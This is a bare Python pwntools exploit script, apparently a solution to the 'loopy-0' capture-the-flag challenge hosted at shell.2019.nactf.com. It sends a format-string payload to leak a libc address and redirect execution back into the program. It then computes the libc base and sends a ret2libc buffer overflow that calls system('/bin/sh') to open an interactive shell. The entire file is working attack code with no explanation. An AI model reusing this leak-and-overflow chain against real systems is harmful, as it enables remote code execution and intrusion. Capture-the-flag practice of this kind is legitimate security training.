#!/usr/bin/env python

from pwn import *

libc = ELF('./libc.so.6')
#r = process(["./loopy-0"], env={"LD_PRELOAD": "./ld-2.28.so ./libc.so.6"})
r = remote("shell.2019.nactf.com", 31283)
pause()

print(r.recvuntil("Type something>"))
payload = (
    "%27$x" +
    "A" * 71 +
    p32(0x8049192)
)

r.sendline(payload)

r.recv(1024)
data = r.recv(1024)

leak = re.search(r"([0-9a-f]+)A", data).group(1)
leak = u32(leak.decode('hex')[::-1])

base = leak - 0x1ab41 

system = base + libc.symbols["system"]
binsh = base +libc.search("/bin/sh").next()

print("Leak", hex(leak))
print("Base", hex(base))
print("System", hex(system))
print("bin/sh", hex(binsh))

#print(r.recv(1024))
payload = (
    "A" * 76 +
    p32(system) +
    "BBBB" +
    p32(binsh)
)
r.sendline(payload)

r.interactive()

r.close()



# 0xf7dcc000
